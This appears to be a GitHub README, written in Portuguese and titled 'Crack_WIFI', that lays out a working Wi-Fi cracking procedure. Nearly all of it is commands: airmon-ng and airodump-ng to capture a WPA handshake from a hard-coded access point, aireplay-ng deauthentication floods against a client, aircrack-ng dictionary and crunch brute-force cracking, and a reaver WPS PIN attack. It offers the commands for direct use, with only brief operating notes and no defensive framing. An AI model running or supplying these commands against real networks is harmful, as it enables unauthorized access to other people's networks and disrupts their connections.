# Crack_WIFI
Crack_WIFI <br>
 <br>
airmon-ng check wlan0  <br>
airmon-ng check kill  <br>
airmon-ng start wlan0  <br>
airodump-ng wlan0 -a --band abg  <br>
airodump-ng -c 11 -d E4:C0:E2:1C:6E:6B -a --band abg wlan0  <br>
airodump-ng -c 11 -d E4:C0:E2:1C:6E:6B -a --band abg -w captura wlan0  <br>
aireplay-ng --deauth 0 -a E4:C0:E2:1C:6E:6B -c 28:87:BA:3A:AF:CF wlan0  <br><br>
<b> APENAS DEPOIS DE APARECER NO CAMPO NOTES EAPOL, PARA PODER PARAR A CAPTURA  </b> <br><br>
![IMAGE01](https://github.com/fernandomxm/Crack_WIFI/blob/main/image01.png) 
![IMAGE02](https://github.com/fernandomxm/Crack_WIFI/blob/main/wpa-4-way-handshake-workflow.png) <br> <br>
PODE SER UTILIZADO: wpaclean, para gerar o arquivo .cap "LIMPO", apenas com EAPOL KEY: <br>
<b>wpaclean clean.cap captura.cap</b>  <br><br>
<b> aircrack-ng -w /usr/share/wordlists/rockyou.txt -b E4:C0:E2:1C:6E:6B clean.cap  </b> <br>
<br>
Pode ser utilizada uma automatização com o crunch (On-the-Fly Wordlist Generation): <br> <br>
<b> crunch 8 10 -f /usr/share/crunch/charset.lst mixalpha | aircrack-ng -b E4:C0:E2:1C:6E:6B -w - clean.cap </b> <br> <br>
Dessa forma, ele ira gerar uma lista gigante de de teste, sem consumir espaço em disco. <br> <br>
Para gerar a wordlist pode ser usado o: <br>
crunch 8 10 -f /usr/share/crunch/charset.lst mixalpha -o wordlist.txt <br>
<br>
<b> apt -y install seclists </b> <br>
/usr/share/seclists/ <br><br>
O parâmetro PWR é o sinal WIFI. Quando mais perto de 0, melhor o sinal.  <br> <br> <br>
<b> FORMA VIA WPS SEM USO DE WORDLIST (Isso só funciona se o roteador estiver configurado para não usar PBC (Push Button Authentication) </b> <br>
wash --interface wlan0 <br>
reaver --bssid E4:C0:E2:1C:6E:6B  --channel 10 --interface wlan0 -vvv --no-associate <br>
aireplay-ng --fakeauth 30 -a E4:C0:E2:1C:6E:6B -h mac_wlan0 wlan0  <br> <br>
<b> Avaliar linha com: WPA PSK: </b>
